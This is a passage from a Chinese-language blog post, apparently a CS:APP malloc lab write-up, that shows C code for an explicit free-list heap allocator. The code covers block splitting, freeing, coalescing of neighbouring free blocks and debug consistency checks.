class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="place-1"><a href="#place-1" class="headerlink" title="place"></a>place</h3><p>本函数实现,将bp所指向的free block在可能的情况下做split.具体来说,是当当前free block的size &gt;= 请求size+最小block时会做split.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief place block</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp </span></span><br><span class="line"><span class="comment"> * @param size </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">place</span><span class="params">(<span class="keyword">void</span> *bp, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> origin_size;</span><br><span class="line">    <span class="keyword">size_t</span> remain_size;</span><br><span class="line"></span><br><span class="line">    origin_size = GET_SIZE(HDRP(bp));</span><br><span class="line">    remain_size = origin_size - size;</span><br><span class="line">    <span class="keyword">if</span> (remain_size &gt;= MIN_BLOCK)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 可拆分</span></span><br><span class="line">        <span class="comment">// 设置拆分后剩下的块的size和allocate情况</span></span><br><span class="line">        <span class="keyword">char</span> *remain_blockp = (<span class="keyword">char</span> *)(bp) + size;</span><br><span class="line">        PUT(HDRP(remain_blockp), PACK(remain_size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(remain_blockp), PACK(remain_size, <span class="number">0</span>));</span><br><span class="line">        <span class="comment">// 更新指针，将剩下块加入到free list中</span></span><br><span class="line">        <span class="keyword">char</span> *prev_blockp = PREV_FREE_BLKP(bp);</span><br><span class="line">        <span class="keyword">char</span> *next_blockp = NEXT_FREE_BLKP(bp);</span><br><span class="line">        PUT(NEXT_PTR(remain_blockp), next_blockp);</span><br><span class="line">        PUT(PREV_PTR(remain_blockp), prev_blockp);</span><br><span class="line">        PUT(NEXT_PTR(prev_blockp), remain_blockp);</span><br><span class="line">        <span class="keyword">if</span> (next_blockp != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            PUT(PREV_PTR(next_blockp), remain_blockp);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置分配的块</span></span><br><span class="line">        PUT(HDRP(bp), PACK(size, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, <span class="number">1</span>));</span><br><span class="line">        <span class="comment">// 断开原block与free list的连接</span></span><br><span class="line">        PUT(NEXT_PTR(bp), <span class="literal">NULL</span>);</span><br><span class="line">        PUT(PREV_PTR(bp), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 不可拆分</span></span><br><span class="line">        <span class="comment">// 更新header和footer</span></span><br><span class="line">        PUT(HDRP(bp), PACK(origin_size, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(origin_size, <span class="number">1</span>));</span><br><span class="line">        <span class="comment">// 移除free block from free list</span></span><br><span class="line">        delete_from_free_list(bp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="delete-from-free-list"><a href="#delete-from-free-list" class="headerlink" title="delete_from_free_list"></a>delete_from_free_list</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 从free list中删除 bp 所在节点</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">delete_from_free_list</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *prev_free_block = PREV_FREE_BLKP(bp);</span><br><span class="line">    <span class="keyword">void</span> *next_free_block = NEXT_FREE_BLKP(bp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (next_free_block == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev_free_block), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev_free_block), next_free_block);</span><br><span class="line">        PUT(PREV_PTR(next_free_block), prev_free_block);</span><br><span class="line">        <span class="comment">// 断开连接</span></span><br><span class="line">        PUT(NEXT_PTR(bp), <span class="literal">NULL</span>);</span><br><span class="line">        PUT(PREV_PTR(bp), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="mm-free-1"><a href="#mm-free-1" class="headerlink" title="mm_free"></a>mm_free</h3><p>这里的free函数和implicit list的free函数一致,重点在coalesce函数.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_free - Freeing a block does nothing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mm_free</span><span class="params">(<span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(ptr));</span><br><span class="line"></span><br><span class="line">    PUT(HDRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    coalesce(ptr);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;free\n&quot;</span>);</span><br><span class="line">    debug();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="coalesce-1"><a href="#coalesce-1" class="headerlink" title="coalesce"></a>coalesce</h3><p>coalesce是每种分配器的重点,需要考虑如何合并在虚拟地址空间中的相邻blocks之间的关系, 和implicit一样,explicit也有4种情况:</p><p><img data-src="https://pic.downk.cc/item/5f466750160a154a6795783c.png" alt="image-20200826214359077"></p><p><img data-src="https://pic.downk.cc/item/5f46675f160a154a67957e67.png" alt="image-20200826214409356"></p><p><img data-src="https://pic.downk.cc/item/5f466771160a154a6795847c.png" alt="image-20200826214415780"></p><p><img data-src="https://pic.downk.cc/item/5f46677a160a154a679586f3.png" alt="image-20200826214426686"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 合并地址空间，并将可用free block插入到free list中</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp 当前block的payload首地址</span></span><br><span class="line"><span class="comment"> *           </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">coalesce</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *prev_blockp = PREV_BLKP(bp);</span><br><span class="line">    <span class="keyword">char</span> *next_blockp = NEXT_BLKP(bp);</span><br><span class="line">    <span class="keyword">char</span> *mem_max_addr = (<span class="keyword">char</span> *)mem_heap_hi() + <span class="number">1</span>; <span class="comment">// heap的上边界</span></span><br><span class="line">    <span class="keyword">size_t</span> prev_alloc = GET_ALLOC(HDRP(prev_blockp));</span><br><span class="line">    <span class="keyword">size_t</span> next_alloc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (next_blockp &gt;= mem_max_addr)</span><br><span class="line">    &#123; <span class="comment">// next_block超过heap的上边界，只用考虑prev_blockp</span></span><br><span class="line">        <span class="keyword">if</span> (!prev_alloc)</span><br><span class="line">        &#123;</span><br><span class="line">            case3(bp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            case1(bp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        next_alloc = GET_ALLOC(HDRP(next_blockp));</span><br><span class="line">        <span class="keyword">if</span> (prev_alloc &amp;&amp; next_alloc)</span><br><span class="line">        &#123; <span class="comment">// case 1: 前后都已经分配</span></span><br><span class="line">            case1(bp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; next_alloc)</span><br><span class="line">        &#123; <span class="comment">//case 3: 前未分配，后分配</span></span><br><span class="line">            case3(bp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (prev_alloc &amp;&amp; !next_alloc)</span><br><span class="line">        &#123; <span class="comment">// case 2: 前分配，后未分配</span></span><br><span class="line">            case2(bp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123; <span class="comment">// case 4: 前后都未分配</span></span><br><span class="line">            case4(bp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="case1"><a href="#case1" class="headerlink" title="case1"></a>case1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 前后都分配</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp </span></span><br><span class="line"><span class="comment"> * @return void* </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">case1</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    insert_to_free_list(bp);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="case2"><a href="#case2" class="headerlink" title="case2"></a>case2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 前分配后未分配</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp </span></span><br><span class="line"><span class="comment"> * @return void* </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">case2</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *next_blockp = NEXT_BLKP(bp);</span><br><span class="line">    <span class="keyword">void</span> *prev_free_blockp;</span><br><span class="line">    <span class="keyword">void</span> *next_free_blockp;</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(bp)) + GET_SIZE(HDRP(next_blockp));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新块大小</span></span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(next_blockp), PACK(size, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新前后free block指针</span></span><br><span class="line">    prev_free_blockp = PREV_FREE_BLKP(next_blockp);</span><br><span class="line">    next_free_blockp = NEXT_FREE_BLKP(next_blockp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 边界检查</span></span><br><span class="line">    <span class="keyword">if</span> (next_free_blockp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev_free_blockp), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev_free_blockp), next_free_blockp);</span><br><span class="line">        PUT(PREV_PTR(next_free_blockp), prev_free_blockp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    insert_to_free_list(bp);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="case3"><a href="#case3" class="headerlink" title="case3"></a>case3</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief case 3 前一个block未分配，后一个块已分配</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp 当前块的payload首地址</span></span><br><span class="line"><span class="comment"> * @return void* 合并后的payload首地址</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">case3</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *prev_blockp = PREV_BLKP(bp);</span><br><span class="line">    <span class="keyword">char</span> *prev_free_blockp;</span><br><span class="line">    <span class="keyword">char</span> *next_free_blockp;</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(bp)) + GET_SIZE(HDRP(prev_blockp));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新块大小</span></span><br><span class="line">    PUT(HDRP(prev_blockp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(prev_blockp), PACK(size, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找到前后free块并更新</span></span><br><span class="line">    next_free_blockp = NEXT_FREE_BLKP(prev_blockp);</span><br><span class="line">    prev_free_blockp = PREV_FREE_BLKP(prev_blockp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 边界检查</span></span><br><span class="line">    <span class="keyword">if</span> (next_free_blockp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev_free_blockp), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev_free_blockp), next_free_blockp);</span><br><span class="line">        PUT(PREV_PTR(next_free_blockp), prev_free_blockp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LIFO策略，插入到free list的头部</span></span><br><span class="line">    insert_to_free_list(prev_blockp);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="case4"><a href="#case4" class="headerlink" title="case4"></a>case4</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 前后都未分配</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp </span></span><br><span class="line"><span class="comment"> * @return void* </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">case4</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *prev_blockp;</span><br><span class="line">    <span class="keyword">void</span> *prev1_free_blockp;</span><br><span class="line">    <span class="keyword">void</span> *next1_free_blockp;</span><br><span class="line">    <span class="keyword">void</span> *next_blockp;</span><br><span class="line">    <span class="keyword">void</span> *prev2_free_blockp;</span><br><span class="line">    <span class="keyword">void</span> *next2_free_blockp;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line">    prev_blockp = PREV_BLKP(bp);</span><br><span class="line">    next_blockp = NEXT_BLKP(bp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新size</span></span><br><span class="line">    <span class="keyword">size_t</span> size1 = GET_SIZE(HDRP(prev_blockp));</span><br><span class="line">    <span class="keyword">size_t</span> size2 = GET_SIZE(HDRP(bp));</span><br><span class="line">    <span class="keyword">size_t</span> size3 = GET_SIZE(HDRP(next_blockp));</span><br><span class="line">    size = size1 + size2 + size3;</span><br><span class="line">    PUT(HDRP(prev_blockp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(next_blockp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    bp = prev_blockp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新前半部 free block指针</span></span><br><span class="line">    prev1_free_blockp = PREV_FREE_BLKP(prev_blockp);</span><br><span class="line">    next1_free_blockp = NEXT_FREE_BLKP(prev_blockp);</span><br><span class="line">    <span class="keyword">if</span> (next1_free_blockp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev1_free_blockp), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev1_free_blockp), next1_free_blockp);</span><br><span class="line">        PUT(PREV_PTR(next1_free_blockp), prev1_free_blockp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新后半部 free block指针</span></span><br><span class="line">    prev2_free_blockp = PREV_FREE_BLKP(next_blockp);</span><br><span class="line">    next2_free_blockp = NEXT_FREE_BLKP(next_blockp);</span><br><span class="line">    <span class="keyword">if</span> (next2_free_blockp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev2_free_blockp), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev2_free_blockp), next2_free_blockp);</span><br><span class="line">        PUT(PREV_PTR(next2_free_blockp), prev2_free_blockp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据LIFO策略插入free list</span></span><br><span class="line">    insert_to_free_list(bp);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="其余debug用的函数"><a href="#其余debug用的函数" class="headerlink" title="其余debug用的函数"></a>其余debug用的函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    print_allocated_info();</span><br><span class="line">    print_free_blocks_info();</span><br><span class="line">    consistent_check();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief  打印分配情况</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_allocated_info</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line">    <span class="keyword">size_t</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *mem_max_addr = mem_heap_hi();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=============start allocated info===========\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (bp = NEXT_BLKP(free_list_head); bp &lt; mem_max_addr &amp;&amp; GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>; bp = NEXT_BLKP(bp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (GET_ALLOC(HDRP(bp)) == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ++idx;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;block%d range %p  %p size=%d, payload %p  %p block size=%d\n&quot;</span>, idx, HDRP(bp), FTRP(bp) + WSIZE, FTRP(bp) - HDRP(bp) + WSIZE, (<span class="keyword">char</span> *)bp, FTRP(bp), FTRP(bp) - (<span class="keyword">char</span> *)(bp));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=============end allocated info===========\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">consistent_check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检查free list中的所有block都为free</span></span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line">    <span class="keyword">char</span> *mem_max_heap = mem_heap_hi();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (bp = NEXT_FREE_BLKP(free_list_head); bp != <span class="literal">NULL</span>; bp = NEXT_FREE_BLKP(bp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (GET_ALLOC(HDRP(bp)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d free list中存在块已分配\n&quot;</span>, __LINE__);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否所有free block都在free list中</span></span><br><span class="line">    <span class="keyword">for</span> (bp = NEXT_BLKP(free_list_head); bp &lt;= mem_max_heap; bp = NEXT_BLKP(bp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!GET_ALLOC(HDRP(bp)) &amp;&amp; !is_in_free_list(bp))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d 存在free block %p 不在free list中\n&quot;</span>, __LINE__, bp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 